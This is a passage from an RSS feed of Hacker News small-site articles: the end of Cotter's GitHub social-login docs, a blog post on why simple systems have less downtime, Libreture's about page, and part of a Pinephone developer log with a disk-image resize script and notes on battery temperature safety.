data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:11"><span> </span></span><span data-offset-key="00bfdb4e7e9b4863b85a60ef48dccff0:12"></span></span></p><p><span data-key="2e0f61a310114dd48b1690d34682d148"><span data-offset-key="2e0f61a310114dd48b1690d34682d148:0"><span>}</span></span></span></p></pre></div><p data-key="cfa9ad0208e04ccf8534d32ad7c47b01"><span><span data-key="05bae9b1a71e45a893da664396ba90af"><span data-offset-key="05bae9b1a71e45a893da664396ba90af:0">When your users sign in with Github, Github returns an </span><span data-offset-key="05bae9b1a71e45a893da664396ba90af:1"><code spellcheck="false" data-slate-leaf="true">access_token</code></span><span data-offset-key="05bae9b1a71e45a893da664396ba90af:2"> that you can use to call their API. We store this information for you. To get the </span><span data-offset-key="05bae9b1a71e45a893da664396ba90af:3"><code spellcheck="false" data-slate-leaf="true">access_token</code></span><span data-offset-key="05bae9b1a71e45a893da664396ba90af:4"> for each user, follow the instructions below:</span></span></span></p><p data-key="416bb8d8fb6b496198e5ce35cfad8c3f"><span><span data-key="a3e8d70a82c3435f86f27bc810f5a033"><span data-offset-key="a3e8d70a82c3435f86f27bc810f5a033:0">Logging-in to social providers </span><span data-offset-key="a3e8d70a82c3435f86f27bc810f5a033:1"><strong data-slate-leaf="true">requires us to redirect the user to the provider's page to login</strong></span><span data-offset-key="a3e8d70a82c3435f86f27bc810f5a033:2"> when necessary. When the login process is done, the users will be redirected back </span><span data-offset-key="a3e8d70a82c3435f86f27bc810f5a033:3"><strong data-slate-leaf="true">to the page where you embedded the form</strong></span><span data-offset-key="a3e8d70a82c3435f86f27bc810f5a033:4">:</span></span></span></p><p data-key="5ed4d079132e452fa7309eb3da53a456"><span><span data-key="273997f5890d4d668d38a06ec0f6cf20"><span data-offset-key="273997f5890d4d668d38a06ec0f6cf20:0">For example:</span></span></span></p><ul data-key="380d3254bd984d37806320d852266009"><li><div data-key="fb56b92c9ac8492c9886c2c4f086056c"><p data-key="d124d660622945e2a71e861372ac56e0"><span><span data-key="cddf934ddb0a40ac9ba150af07698489"><span data-offset-key="cddf934ddb0a40ac9ba150af07698489:0">Login Page that contains the form: </span><span data-offset-key="cddf934ddb0a40ac9ba150af07698489:1"><code spellcheck="false" data-slate-leaf="true">example.com/login</code></span></span></span></p><ul data-key="e2a4cbe63fff450697e985693cfc4d6d"><li><p data-key="e31a0e2a52e349bdb1d22b45b79f8045"><span><span data-key="dd06e43a11c04c9c913e63b7e4977b45"><span data-offset-key="dd06e43a11c04c9c913e63b7e4977b45:0">User login to Github: redirect to </span><span data-offset-key="dd06e43a11c04c9c913e63b7e4977b45:1"><code spellcheck="false" data-slate-leaf="true">github.com/oauth/....</code></span></span></span></p></li><li><p data-key="f1f986e5c4c94b23b6ee84e318530e61"><span><span data-key="02505e80dbea4a09bf34d9401bf316d1"><span data-offset-key="02505e80dbea4a09bf34d9401bf316d1:0">User finish login: redirect back to </span><span data-offset-key="02505e80dbea4a09bf34d9401bf316d1:1"><code spellcheck="false" data-slate-leaf="true">example.com/login?code=xyz&amp;state=abc</code></span></span></span></p></li></ul></div></li></ul><p data-key="e1ddc2629c08410e8273a6cd12930426"><span><span data-key="6eba70275b3e469a92ddb1443cc7eb4f"><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:0">As you can see, we pass in a </span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:1"><code spellcheck="false" data-slate-leaf="true">code</code></span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:2"> and </span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:3"><code spellcheck="false" data-slate-leaf="true">state</code></span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:4"> and other parameters when redirecting back to your login page. </span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:5"><strong data-slate-leaf="true">Cotter's Login Form automatically handles this query parameters</strong></span><span data-offset-key="6eba70275b3e469a92ddb1443cc7eb4f:6"> for you and will resolve the Promise with the usual Cotter user information response. </span></span></span></p><p data-key="0e62672d62ef48cfb1800b095a5853a9"><span><span data-key="6627064a81884a068a9a1d8fc77d9430"><span data-offset-key="6627064a81884a068a9a1d8fc77d9430:0"><strong data-slate-leaf="true">With that said, make sure your UI takes into account that the user will be redirected away and then back to your login page.</strong></span></span></span></p><div data-key="0d816b6270b34f628a6a51094ae38b53"><p data-key="9292a1b79710451e9be60b1497fddda9"><span><span data-key="ff55bfb695574cadb58f11bf6fd6490d"><span data-offset-key="ff55bfb695574cadb58f11bf6fd6490d:0">This feature is not yet fully supported on Safari.</span></span></span></p></div><p data-key="b6cbbaa232244eb9bc794cec097f36b3"><span><span data-key="5fef0c9a845b447a999c814f72fb09e2"><span data-offset-key="5fef0c9a845b447a999c814f72fb09e2:0"><span data-slate-zero-width="n">‚Äã</span></span></span></span></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://docs.cotter.app/sdk-reference/web/sign-in-with-social-login-provider</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596651</guid>
            <pubDate>Sat, 26 Sep 2020 05:24:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple Systems Have Less Downtime]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24596640">thread link</a>) | @fagnerbrack
<br/>
September 25, 2020 | https://www.gkogan.co/blog/simple-systems/ | <a href="https://web.archive.org/web/*/https://www.gkogan.co/blog/simple-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>The Maersk Triple-E Class container ship is 1,300 feet long, carries over 18,000 containers across 11,000 miles between Europe and Asia, and‚Ä¶ Its entire crew can fit inside a passenger van.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/e84e2eff3c5307ee69a77b3313684a5a90aa0981/d7909/images/uploads/maersk-container-ship.jpg" alt="Maersk container ship"></p>

<p>As a former naval architect and a current <a href="https://www.gkogan.co/">marketing consultant to startups</a>, I found that the same principle that lets a 13-person crew navigate the world‚Äôs largest container ship to a port halfway around the world without breaking down also applies to startups working towards aggressive growth goals:</p>

<p><strong>Simple systems have less downtime.</strong></p>

<p>Ships contain simple systems that are easy to operate and easy to understand, which makes them easy to fix, which means they have less downtime. An important quality, considering that ‚Äúdowntime‚Äù for a ship could mean being stranded thousands of miles from help.</p>

<p>Take the ship‚Äôs steering system, for instance. The rudder is pushed left or right by metal rods. Those rods are moved by hydraulic pressure. That pressure is controlled by a hydraulic pump. That pump is controlled by an electronic signal from the wheelhouse. That signal is controlled by the autopilot. It doesn‚Äôt require a rocket scientist or a naval architect to find the cause of and solution to any problem:</p>

<ul>
  <li>If the autopilot fails, steer the ship manually from the wheelhouse.</li>
  <li>If the electronic signals fail, go to the rudder control room to control the pump by hand, while talking with the bridge through a <a href="https://en.wikipedia.org/wiki/Sound-powered_telephone">simple sound-powered phone</a>.</li>
  <li>If the hydraulics fail, use the mechanically linked emergency steering wheel.</li>
  <li>If the mechanical linkage fails, hook a chain to both sides of the rudder and pull in the direction you want!</li>
</ul>

<p><img src="https://d33wubrfki0l68.cloudfront.net/4676c41bcb0133d35827e62d044f82c9511ffd21/bb56a/images/uploads/174.jpg" alt="Cartoon about redundancy"></p>

<p>Startups, like ships, can‚Äôt afford to stall from system downtimes. Extended downtime in sales, marketing, web, customer support, hiring, product, and other systems may cause irreparable damage to the growth rate.</p>

<p>(Although automation is prevalent on modern ships, it only affects the time it takes to do things and the attention required to monitor everything. The propulsion and auxiliary systems are more simple than ever, thanks to modern diesel and electric propulsion systems that replaced pipe-laden steam plants.)</p>

<h2 id="why-simplicity-leads-to-less-downtime">Why Simplicity Leads to Less Downtime</h2>

<h3 id="1-proficiency-takes-less-time">1. Proficiency takes less time.</h3>

<p>If the person responsible for the system leaves, falls overboard, <a href="https://en.wikipedia.org/wiki/Bus_factor">gets hit by a bus</a>, or gets pulled into another project, another person can take over without much learning or training. That means more people are able to step in to troubleshoot and fix issues.</p>

<p>For example, an analytics dashboard built with Tableau is likely to have more qualified people to fix it than one built with a patchwork of custom scripts and APIs. Nobody should have to pull data scientists or product developers away from their work to fix a bar chart.</p>

<hr>

<p><em>By the way, I write an article like this every month or so, covering lessons learned from growing B2B software startups. Get an email update when the next one is published:</em>
<!-- Begin MailChimp Signup Form --></p>



<!--End mc_embed_signup-->
<hr>

<h3 id="2-troubleshooting-takes-less-time">2. Troubleshooting takes less time.</h3>

<p>In a system where the behavior of each component and its relationship to other comments is easily understood, ruling out issues and finding the broken component‚Äîthe root cause‚Äîis more intuitive.</p>

<p>For example, if a company has many downloadable whitepapers on their website, and they‚Äôre all gated behind a single form‚Äîas opposed to a custom form for each one‚Äîthen they need only troubleshoot one form and one automation workflow if the whitepaper downloads stop working.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/495bdd177c0618760025c9d94dcfc8129aa117f5/ec606/images/uploads/91.jpg" alt="Cartoon about a ship being stuck in Nebraska"></p>

<h3 id="3-more-alternative-solutions">3. More alternative solutions.</h3>

<p>When each part of the system has a clear function, alternatives are easier to find.</p>

<p>For example, imagine a Salesforce process that uses a mishmash of automation and third-party tools to score, filter, classify, and assign new sales leads. If that fails then there is no obvious replacement. Everything will be put on hold until the process is fixed or replaced with a similarly complex solution.</p>

<p>Now imagine a sales process in which the sales team is simply notified of each new sales lead along with pertinent details, letting them decide whether or not to follow up with the lead. If the Salesforce notification step fails, it‚Äôs easy to come up with a hundred other ways of getting that information to the sales team: Reports, Slack notifications, list exports, manual observation, or using Zapier to send an alert through virtually any medium. The downtime would last a few minutes, at most.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/26ba2a1619df8df60c6a56e3ec07a7b81478f644/75961/images/uploads/77.jpg" alt="Cartoon about boats grounding because of a broken lighthouse"></p>

<hr>

<h2 id="startup-story">Startup Story</h2>

<p>One of my clients was using a legacy enterprise marketing automation platform (Marketo) with 629 automated processes built up over several years. When something broke or needed tweaking, there was only one person among the 150+ employees who could do it. Each issue took several days or even weeks to fix, all the while marketing campaigns stalled. And with each patch, the overall system only grew more complex.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/c25f453aa08d83e439b8d4ad5240ea4842ff286f/421d6/images/uploads/127.jpg" alt="Cartoon about a sailor coming home drunk"></p>

<p>When that person left the company, there was nobody left to operate the system. With every passing week a new issue would come up, faster than we could find and fix them.</p>

<p>To keep the marketing operation from coming to a standstill, I rushed to migrate the company from Marketo to HubSpot, a more simple platform that would be easier to operate and troubleshoot.</p>

<p>The migration took just one week. Along the way, however, another complex system reared its head: Salesforce. There were 10 automated processes in Salesforce with over 100 combined operations, all dependent on various delicately timed automations in Marketo. It took two weeks‚Äîtwice as long as the migration‚Äîto understand and integrate those processes with the new marketing platform.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/169a7904b8e2c26fd693968dbb2250d75eba25f3/7e08a/images/uploads/193.jpg" alt="Cartoon about being stranded on an island"></p>

<p>Overall, these two complex systems (in Marketo and in Salesforce) resulted in six weeks of downtime for the marketing team and three weeks of downtime for the sales team. That‚Äôs not counting the many weeks of downtime they experienced throughout the past few years, nor the many weeks of downtime they would experience in the future if we did not overhaul the underlying systems.</p>

<p>In the end, the system I put in place had 97% fewer processes (from 629 to 20) while providing all the same capabilities. A bug that was found a few days later got resolved in four minutes.</p>

<p>This experience made me wonder what principles startups can adopt to avoid the pitfalls of complex systems.</p>

<h2 id="principles-for-simple-systems">Principles for Simple Systems</h2>

<p>Rip-and-replace projects are painful and disruptive, even when the long-term benefits are worth it. Many startups‚Äîas with ships‚Äîdon‚Äôt have the luxury of time and resources to perform overhauls once they‚Äôre underway.</p>

<p>Here are my three principles to follow when evaluating or implementing new systems:</p>

<ol>
  <li>
    <p><strong>Features don‚Äôt justify complexity.</strong> What good is a complicated flight control system if it grounds an entire fleet of aircraft, or an enterprise marketing platform like Marketo if nobody can run a marketing campaign? Choose tools that are simple to operate over those that promise the most features. A frequent recommendation I give to startups is to choose HubSpot for their marketing platform instead of an enterprise platform like Marketo, Eloqua, or Pardot.</p>
  </li>
  <li>
    <p><strong>Complex ideas lead to complex implementations.</strong> If it takes too long to explain or grasp an idea, then its implementation will be complex, and it will take too long to fix when something inevitably breaks. For example, a proposed sales process that requires an hour-long presentation will be a nightmare to maintain, regardless of how clever it seems.</p>
  </li>
  <li>
    <p><strong>Modifications before additions.</strong> When new requirements come up, the tendency is to add layers on top of the existing system‚Äîby way of additional steps or integrations. Instead, see if the system‚Äôs core can be modified to meet the new requirements. The change may cause (planned) downtime upfront, as with my Marketo-to-HubSpot migration example, but less (unplanned) downtime over the long term.</p>
  </li>
</ol>

<h2 id="smooth-sailing">Smooth Sailing</h2>

<blockquote>
  <p>‚Äú‚Ä¶ the more simple any thing is, the less liable it is to be disordered, and the easier repaired when disordered.‚Äù ‚Äî Thomas Paine, Common Sense, 1776</p>
</blockquote>

<p>There‚Äôs no question things will break along the startup journey, just as surely as they do on a ship crossing the globe. However, if the onboard systems are simple, those issues won‚Äôt leave the startup drifting helplessly in the middle of the ocean.</p>

<hr>

<p><em>Image source: <a href="http://maritime-connector.com/ship/maersk-mc-kinney-moller-9619907/">http://maritime-connector.com/ship/maersk-mc-kinney-moller-9619907/</a></em></p>


    <p>‚óº</p>

    <p>PS - Liked this article? I write one every month or so, covering lessons learned on B2B startup growth. Don't miss the next one:</p>

    <!-- Begin MailChimp Signup Form -->
    

    <!--End mc_embed_signup-->
    
    <p>If you need help with marketing and revenue growth, <a href="https://www.gkogan.co/contact/">get in touch</a>.</p>

  </div>

  

  
  
  



</article>

<!-- Begin MailChimp popup signup form -->



<!-- End MailChimp popup signup form -->
      </div>
    </div></div>]]>
            </description>
            <link>https://www.gkogan.co/blog/simple-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596640</guid>
            <pubDate>Sat, 26 Sep 2020 05:23:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Libreture]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24596293">thread link</a>) | @cxr
<br/>
September 25, 2020 | https://www.libreture.com/page/about/ | <a href="https://web.archive.org/web/*/https://www.libreture.com/page/about/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	<header>
		
		<!--<p><strong>E-book & comic storage for hardcore readers.</strong></p>-->
	</header>
	<section id="article-body">
		<div>	
			<h2>E-book &amp; comic storage for hardcore readers</h2>
			<p><strong>Upload your e-books, digital comics and magazines, organise them into reading lists, and discover great new titles with Libreture.</strong></p>
			<p><img src="https://www.libreture.com/static/images/landing/1.png" alt="Libreture turns boring e-book files into beautiful covers and informative text."></p><h2>Upload, Organise, Discover</h2>
			<p>Specially designed for DRM-free e-books and digital comics, Libreture keeps your books safe, helps you organise them into reading lists, keep track of where you bought them, and download them to any device whenever you like.</p>
			<!--<p>Put an end to manually cataloguing your DRM-free e-books. Upload them to Libreture, and help promote DRM-free bookshops along they way.</p>-->
			<!--<h3>There's no such thing as too many e-books</h3>-->
			<p><strong>Easy, Convenient, No Fuss</strong></p>
			<ul id="benefits">
				<li><br> <strong>Upload</strong> and automatically catalogue all your DRM-free <em>ePub</em>, <em>Mobi</em>, <em>PRC</em>, <em>PDF</em>, <em>CBZ</em>, and <em>CBR</em> books and comics.</li>
				<li><br> <strong>Organise</strong> your library into handy reading lists that help you manage your collection.</li>
				<!--<li><i class="fa fa-circle" aria-hidden="true"></i><br /> Browse your actual book files, with covers.</li>-->
				<li><br> <strong>Share</strong> your reading lists to help everyone find great DRM-free bookshops.</li>
				<li><br> <strong>Explore</strong> other users' libraries to widen your horizons and discover your next favourite book.</li>
				<!--<li>Find your new favourite books and DRM-free bookshops.</li>-->
				<li><br> <strong>Download</strong> your next <em>To Be Read</em> to any device, any time.</li>
				<li><br> <strong>Private</strong> by default, public by choice. Keep your reading activity hidden, or publicly display some or all.</li>
				<!--<li>No more manually cataloguing your books.</li>-->
				<!--<li>Your books are safe on our UK-based servers, even if you lose your e-reader or the bookshop goes bust.</li>-->
			</ul>
			<p>With Libreture, you can store <em>all your DRM-free e-books</em> and download them to any e-reader whenever you want - no more cables!</p>
			<p>
				<img src="https://www.libreture.com/static/images/diagrams/upload_info.png" alt="Upload books in ePub, Mobi, PRC, PDF, CBZ, CBR format, or as a Zip file.">	
			</p>	
			<!--<p>Libreture helps you plan your reading, record what you've read, and share your activity with others - but with strong privacy tools that put your needs first.
			<h3 style="text-align: center;margin: 1.5em 0;"><i class="fa fa-shield" aria-hidden="true" style="font-size: 3em;margin-bottom: 0.2em;"></i><br /> Private by default - Public by choice</h3>
			<p>Libreture keeps your purchases safe; no more books lost every time an online bookstore closes. You don't even have to remember where you bought them. If something goes wrong, you can download your books again from Libreture.</p>-->
			<p><strong>Libreture is a direct response to the dodgy, monopolistic practices of the large e-book retailers, publishers and distributors.</strong></p>
		</div>
		

		
		<p><strong>Launched in 2017, Libreture is an alternative e-book &amp; comic storage service for readers who want the benefits of an online platform, without the dodgy practices of the large retailers.</strong></p>
		<p>Owned and run by <strong>Kevin Beynon</strong>, its goal is to balance the monopolistic platforms of Amazon, Google, and Apple, with a service that is designed NOT to be tied to its own bookshop or e-reader (not <a href="https://en.wikipedia.org/wiki/Vertical_integration" target="_blank">vertically-integrated</a>). In effect, supporting independent bookshops, publishers, and self-publishing authors, by providing readers with the same book management tools they would normally only get from big companies.</p>
		
		<h2>Why I built Libreture</h2>
		<p><strong>I'm an avid e-book reader and was once a Kindle-owner. After news of Amazon's UK tax-avoidance broke I decided to boycott them and look for alternative e-bookshops.</strong></p>

		<p>I concentrated on finding bookshops that sold DRM-free e-books, to ensure I could read them on any device. I also wanted to support small and independent publishers and bookshops. With this in mind, I compiled a list of <a href="https://www.libreture.com/bookshops">DRM-free bookshops</a>. The list is still growing and is now a key component of Libreture - readers record where they bought their DRM-free books, helping others discover new bookshops.</p>

		<p>A big part of Amazon's service is its book storage and management tools. To avoid these, I began using <em>Shelfari</em>, a library management website. Shelfari was a great tool, but in 2008, the owners <a href="http://shelfari.typepad.com/my_weblog/2008/08/shelfari-joins-the-amazoncom-family.html" target="_blank">sold Shelfari to Amazon</a>. So I moved to <em>Goodreads</em>.</p>

		<p>When the owners of Goodreads also <a href="http://www.goodreads.com/blog/show/413-exciting-news-about-goodreads-we-re-joining-the-amazon-family" target="_blank">sold their business to Amazon</a> in 2013, I had finally had enough. Many others felt the same way.</p>

		<blockquote>"What terrible news. Loss of an independent reader community, now another channel for the faceless machine to leech reader data to withhold from suffering publishers &amp; booksellers. If through this account Amazon has a record of my reading habits I will be deleting the account. Very sad."<br>
		<a href="https://www.goodreads.com/blog/show/413-exciting-news-about-goodreads-we-re-joining-the-amazon-family#comment_70824525" target="_blank">Laura - 28/03/2013</a>
		</blockquote>

		<p>At that point I began building my own stable platform to store e-books, record reading activity, and promote DRM-free bookshops and publishers.</p>
		<p>I built the first version myself, and for myself. It soon became clear that others may find it useful too. Working with an external development company, we re-built Libreture from scratch.</p> 
		<p><strong><a href="https://www.libreture.com/blog/libreture-open-business/" target="_blank">Libreture launched to the public in March, 2017</a></strong></p>
		<p><strong>So far, readers are storing 8,068 e-books with Libreture.</strong></p>
		
		


		<h2>Price</h2>
		<p><strong>You can use Libreture absolutely free to store a limited amount of e-books, and you can upgrade to a paid plan to store much, much more.</strong></p>
		<p>Libreture doesn't offer a discounted annual rate that only saves money for those that can afford to pay up front. The fee is set for each plan and covers the cost of development, infrastructure, storage for your books, as well as a small profit margin. I believe each plan is as reasonable as possible while keeping Libreture sustainable (which means keeping me in tea and biscuits).</p>
		<p>Free and Paid plans ensure that costs are covered as soon as they happen, such as when readers upload large book collections. It also gives you the flexibility to switch plans to whatever suits you, or cancel whenever you want and only pay for the remainder of the month.</p>
		<p>The paid plans also exist to ensure that you, the reader, are always the most important part of Libreture. No advertising, no selling data, and no sellouts. It's just you, Libreture, and loads and loads of great books.</p>
		
		<h3>Tax</h3>
		<p><strong>I believe that tax is the price we pay for a civilised society.</strong></p>
		<p>Since I am a sole-trader and Libreture is not a limited company, I cannot become <a href="https://fairtaxmark.net/" target="_blank">Fair Tax Mark</a> accredited. But I have pledged to follow the guidelines laid down in the <a href="http://www.fairtaxpledge.uk/" target="_blank">Fair Tax Pledge</a>. While not legally binding in any way, I think it's a good indicator of an individual's commitment to comply with the spirit as well as the letter of the law when it comes to taxes.</p>
		<p><img src="https://www.libreture.com/static/images/FTP_cyan-small.png" alt="Fair Tax Pledge logo."></p>
		<p>More information about the Fair Tax Pledge:</p>
		<blockquote>
			<p>Its aim is to help those people who believe in a fair society and playing by the rules to say so publicly; and in the process, to send a powerful message to those who cheat the system.</p>
			<p>It is designed for use by individual citizens and sole traders and produced by the Fair Tax Mark, the organisation behind the label for good taxpaying companies, but is an entirely distinct and separate project.</p>
		</blockquote>

		<h2>Privacy</h2>
		<p><strong>Data privacy is extremely important to me.</strong></p>
		<p>What you read says a lot about you. That's why Libreture reader's book collections, or libraries, are <strong>private by default</strong>. Members must actively choose make their library public before anyone else can see them.</p>
		<p>Even if they make their entire library public, members can still make individual books private. These books never appear publicly, regardless of the reader's library-wide setting.</p>
		<p>Readers don't even need to provide their real name when joining Libreture. An <em>avatar</em> is optional and is stored on Libreture. Details are stored in the UK.</p>
		<p><strong><a href="https://www.libreture.com/page/privacy">Libreture Privacy Policy</a></strong><br><em>(Updated: 26/05/2018)</em></p>

		<h2>Contact me</h2>
<p>If you want to get in touch about Libreture, feel free to contact me at <a href="mailto:support@libreture.com" target="_blank">support@libreture.com</a> or <a href="https://twitter.com/libreture" rel="me" target="_blank">Twitter (@libreture)</a> or <a href="https://mastodon.social/@libreture" rel="me" target="_blank">Mastodon (@libreture@mastodon.social)</a>.</p>
	</section>
</div></div>]]>
            </description>
            <link>https://www.libreture.com/page/about/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24596293</guid>
            <pubDate>Sat, 26 Sep 2020 03:56:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's talk about safety of Pinephone]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24596248">thread link</a>) | @lostmsu
<br/>
September 25, 2020 | https://xnux.eu/log/#017 | <a href="https://web.archive.org/web/*/https://xnux.eu/log/#017">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<ul>
	<li><a href="#019">2020‚Äì09‚Äì20: Downsizing the multi-boot image</a></li>
	<li><a href="#018">2020‚Äì09‚Äì20: Some ways to improve Pinephone safety</a></li>
	<li><a href="#017">2020‚Äì09‚Äì18: Let's talk about safety of Pinephone</a></li>
	<li><a href="#016">2020‚Äì09‚Äì17: Video acceleration experiments with PinePhone</a></li>
	<li><a href="#015">2020‚Äì09‚Äì16: PineBook Pro and Levinboot again</a></li>
	<li><a href="#014">2020‚Äì09‚Äì14: Putting 13 PinePhone distributions on a 8GiB uSD card</a></li>
	<li><a href="#013">2020‚Äì09‚Äì11: Adding postmarket OS to multi-distro image</a></li>
	<li><a href="#012">2020‚Äì09‚Äì11: Ways to help improve Pinephone kernel</a></li>
	<li><a href="#011">2020‚Äì09‚Äì11: PinePhone multi-boot image deduplication tool complete</a></li>
	<li><a href="#010">2020‚Äì09‚Äì10: PinePhone multi-boot image deduplication</a></li>
	<li><a href="#009">2020‚Äì09‚Äì08: PinePhone multi-boot finishing touches / modem improvements</a></li>
	<li><a href="#008">2020‚Äì09‚Äì08: PinePhone multi-boot image optimizations</a></li>
	<li><a href="#007">2020‚Äì09‚Äì07: PinePhone multi-boot image boot testing</a></li>
	<li><a href="#006">2020‚Äì09‚Äì05: PinePhone multi-boot image</a></li>
	<li><a href="#005">2020‚Äì09‚Äì04: Pinebook Pro and Levinboot</a></li>
	<li><a href="#004">2020‚Äì09‚Äì02: Progress on the multi-boot image</a></li>
	<li><a href="#003">2020‚Äì09‚Äì01: More p-boot cleanups and an example configuration</a></li>
	<li><a href="#002">2020‚Äì08‚Äì31: Releasing p-boot GUI bootloader</a></li>
	<li><a href="#001">2020‚Äì08‚Äì31: Getting started</a></li>
</ul>

<article id="019">
<h2 id="toc-2020-09-20-downsizing-the-multi-boot-image">2020‚Äì09‚Äì20:
Downsizing the multi-boot image</h2>

<p>If the multi-boot image doesn't fit your 8GiB uSD card, because it's&nbsp;a tad
too big, you can downsize it a bit by using this script:</p>

<pre><span>#!/bin/bash</span>

<span>set -e -x</span>

<span>mkdir</span> <span>-p</span> m
L<span>=</span><span>`losetup -P --show -f multi.img`</span>
mount <span>-o</span> <span>compress</span><span>-force</span><span>=</span>zstd <span>${L}</span>p2 m
btrfs filesystem resize <span>7000</span>M m
<span>echo</span> <span>",7000M"</span> <span>|</span> sfdisk <span>-N</span> <span>2</span> <span>${L}</span>
umount m
losetup <span>-d</span> <span>"</span><span>$L</span><span>"</span>

truncate <span>-s</span> <span>$((128+7000)</span><span>)</span>M multi.img
</pre>

<p>If something fails in the middle, you may need to recover by calling
<code>umount</code> and <code>losetup -d</code> yourself.
<code>losetup -l</code> can tell you if the image is still exported as a loop
device, and which&nbsp;one.</p>

<p>The image will have the size of 7128&nbsp;MiB after resize and this should fit
more ‚Äû8‚Äú giga something uSD cards, as there are obviously some other giga
units than gigabyte and gigibyte used by some manufacturers.</p>
</article>

<article id="018">
<h2 id="toc-2020-09-20-some-ways-to-improve-pinephone-safety">2020‚Äì09‚Äì20:
Some ways to improve Pinephone safety</h2>

<p>This is a follow up on some issues from the previous article. On surface,
solutions to some of the previously presented issues can seem simple. Toggle a
few registers in PMIC, and we're mostly done. Trouble is that safety mechanisms
are barely ever triggered, by definition. Safety events occur rarely. That means
that the mechanisms are not regularly tested, and it is not known that
they&nbsp;work.</p>

<p>Also it's&nbsp;not clear which code's&nbsp;responsibility fixing the issues should
be. Bootloader, or kernel, or userspace? Finally, there are a bunch of devils in
the details, that complicate the upstreamability of any solution. And having
fixes upstream is necessary to make sure they reach the most&nbsp;users.</p>

<h3 id="toc-necessary-minimum">Necessary minimum</h3>

<p>Nevertheless, at least enabling some pre-existing PMIC functionality blindly
is better than nothing, so that's&nbsp;precisely what I&nbsp;decided to do <a href="https://megous.com/git/p-boot/commit/?id=db73ff85c60944207b7f7368e554003494148a05">in
p-boot</a>. It's&nbsp;the easiest place to start resolving these issues for me
personally, and for other p-boot&nbsp;users.</p>

<p>I&nbsp;fixed two issues:</p>

<ul>
	<li>I&nbsp;enabled the battery temperature monitoring and charging regulation based
	on temperature thresholds defined in the Pinephone battery specification.</li>

	<li>I&nbsp;enabled emergency shutdown when crossing the critical temperature
	of&nbsp;PMIC.</li>
</ul>

<p>I&nbsp;didn't measure the 3kOhm NTC used in Pinephone battery and third party
batteries I&nbsp;bought. I&nbsp;just used a table from some random 3kOhm NTC spec on The
Internet, that seemed like it could match. Hopefully it's&nbsp;close enough.</p>

<p>Trouble with the second fix is that it's&nbsp;a hard power cut-off, so data loss
may occur when PMIC overheats. There are three fixed temperature levels in
AXP803. On level 1&nbsp;the charging is limited, on level 2&nbsp;the interrupt is sent
to SoC, on level 3&nbsp;the PMIC shuts down if configured to do so (by default it
keeps running, and this is what my p-boot fix changes). Ideally, the crossing of
level 2&nbsp;would be handled by Linux to make it safely shut down the system, and
level 3&nbsp;forced power cut-off would never happen. Arguably, if charging was
source of the heating, crossing level 1&nbsp;will lead to resolving the issue, so
the next level will not be reached.</p>

<h3 id="toc-suggested-fixes-elsewhere">Suggested fixes elsewhere</h3>

<p>These fixes will reach a very limited audience. It would be nice to have
these fixes in U-Boot too, but that's&nbsp;not possible at the moment, because
U-Boot doesn't have access to&nbsp;PMIC.</p>

<p>Other places to put the fix is to ATF or Linux kernel. That can reach more
people faster, but there would have to be some generic mechanism to make the fix
upstreamable, otherwise it will not reach people using the mainline Linux kernel
or mainline&nbsp;ATF.</p>

<p>There are some ways to approach this:</p>

<ul>
	<li>Use battery description in DT from <a href="https://github.com/ARM-software/arm-trusted-firmware">ATF</a> to set up
	thresholds in PMIC (ATF has access to&nbsp;PMIC).</li>

	<li>Use battery description in DT from Linux's&nbsp;battery charger driver for
	AXP803 to set up thresholds in PMIC and stop disabling temperature
	monitoring.</li>

	<li>Use <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/devicetree/bindings/power/supply/charger-manager.txt">charger
	manager</a> in Linux, but that looks like it's&nbsp;a completely software solution,
	that will be inferior to PMIC handling the regulation. And it seems it would not
	work in system suspend, anyway, because Linux is not running&nbsp;then.</li>

	<li>Detect Pinephone compatible string in either ATF or Linux and set up the
	thresholds to ad-hoc values for 3kOhm NTC. (easiest, unlikely to be acceptable
	upstream)</li>
</ul>

<p>First, the most generic solution would be to have a description of the
battery in DT describing the Pinephone. Sadly, the <a href="https://elixir.bootlin.com/linux/v5.9-rc5/source/Documentation/devicetree/bindings/power/supply/battery.yaml">current
bindings</a> don't include battery temperature limits.</p>

<p>Also converting from temperature to NTC resistance (which is necessary to
determine the code word from ADC for the limits used by the temperature monitor
logic in PMIC) is not straightforward. It is usually defined in NTC datasheet as
a table. Do I&nbsp;have NTC datasheet? No. I&nbsp;bought the batteries online from some
mobile phone service&nbsp;shop.</p>

<p>There are also equations that approximate the temperature&nbsp;‚Äì resistance
relationship for the NTC, which could be used instead of a fixed table, if one
knows the relevant coefficients. These can be calculated after measuring the
NTC's&nbsp;resistance at a few temperature points when we lack the datasheet.</p>

<p>So generic solution may look like this:</p>

<ul>
	<li>DT contains battery temperature limits from the battery&nbsp;spec</li>

